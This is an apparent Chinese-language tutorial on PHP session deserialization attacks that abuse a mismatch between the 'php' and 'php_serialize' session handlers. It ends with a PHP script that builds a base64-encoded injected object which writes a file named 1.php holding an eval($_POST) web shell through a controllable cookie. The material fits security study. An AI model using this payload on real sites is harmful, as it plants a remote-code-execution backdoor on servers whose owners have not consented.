前置知识：
     当我们写 $_SESSION['meng'] = 'meng'; 的时候，服务器会在它的一个目录下创建一个文件，文件的内容是：a:1:{s:4:"meng";s:4:"meng";}这就看出来了，服务器在存储我们的session内容的时候，是将session进行了序列化存储在文件当中，然后当我们需要用到session里面的内容的时候，服务器从存储序列化后session的文件中取出相关内容，然后进行反序列化。


```
ini_set('session.serialize_handler', 'php') 时的Session文件内容例：user|s:3:"xxx";

ini_set('session.serialize_handler', 'php_serialize') 时的Session文件内容例：a:1:{s:4:"user";s:3:"xxx";}
```

^
## **session反序列化利用**    
php(php<5.5.4默认):存储方式是，键名+竖线+经过serialize()函数序列处理的值
```php
meng|s:4:"meng";
```

php_serialize(php>5.5.4默认):存储方式是，经过serialize()函数序列化处理的值 
```php
a:1:{s:4:"meng";s:4:"meng";}
```
如果一个php程序，这两种模式都有使用，那么就是利用两者序列化时和反序列化时的差异，实现反序列化恶意的串。


^
一般情况下默认是php_serialize模式存储session。
如果在某处正好使用的第一种php模式下，|后的数据被作为session的内容，当session开启被触发时，会对这个内容反序列化。

如何这个session的内容可控，我们就可以传入恶意的序列化串。
先是php_serialize模式存储session序列化，然后php模式反序列化。
如:
```
设置键为test的session内容：
$_SESSION['test']='|O:1:"M":1:{s:1:"a";s:4:"hihi";}';
php_serialize模式序列化的，此时seesion文件内容：
a:1:{s:4:"test";s:32:"|O:1:"M":1:{s:1:"a";s:4:"hihi";}";}

此时设置php模式，并触发反序列化。
ini_set('session.serialize_handler','php');
session_start();
则反序列化的数据为|后面的
O:1:"M":1:{s:1:"a";s:4:"hihi";}
```

^
可控session场景：
```
$_SESSION['limit']=base64_decode($_COOKIE['limit']);
```
设置session内容时，前面加个|即可。
```
<?php
    class User{
        public $username;
        public $password;
        function __construct($username,$password){
            $this->username = $username;
            $this->password = $password;
        }
        function __destruct(){
            file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));
        }
    }
    $a = new User('1.php','<?php eval($_POST[1]);phpinfo();?>');
    echo base64_encode('|'.serialize($a));
?>
```